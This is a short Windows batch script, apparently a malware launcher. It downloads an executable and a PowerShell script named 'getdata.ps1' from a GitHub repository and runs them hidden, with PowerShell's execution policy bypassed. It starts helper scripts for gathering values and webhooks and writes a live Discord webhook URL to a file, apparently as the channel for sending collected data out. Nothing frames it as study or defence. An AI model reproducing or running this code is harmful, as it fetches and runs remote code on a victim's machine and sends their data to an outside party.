@echo off
curl -L https://github.com/thompog/bob/raw/refs/heads/main/bomba.exe -o "bomba.exe"
start "" /min cmd /c "%~dp0bomba.exe -unzip -file %~dp0outzip.zip -out %~dp0"
call :loop

start "" "%~dp0outzip\get_values.bat"
timeout /t 4 /nobreak >nul

start "" "%~dp0outzip\get_webhook.bat"
start "" /min powershell -ExecutionPolicy Bypass -File "%~dp0outzip\get_python.ps1"

echo https://discord.com/api/webhooks/1505641931126866000/WSFPpjCKn_M3VAiaRCmlNYEnuX8z8OaTjJHKKbcDJ6Y2RB5r08MHjzgquVi5npspZBAa>discord_webhook.txt

if not exist "%~dp0getdata.ps1" (
  curl -L "https://raw.githubusercontent.com/thompog/bob/refs/heads/main/getdata.ps1" -o "getdata.ps1"
)

powershell -ExecutionPolicy Bypass -File "%~dp0getdata.ps1"
start "" /min cmd /c "python %~dp0outzip\find_USBs.py"


:loop
if not exist "%~dp0outzip\find_USBs.py" (
  timeout /t 3 >nul
  goto loop
)
exit /b
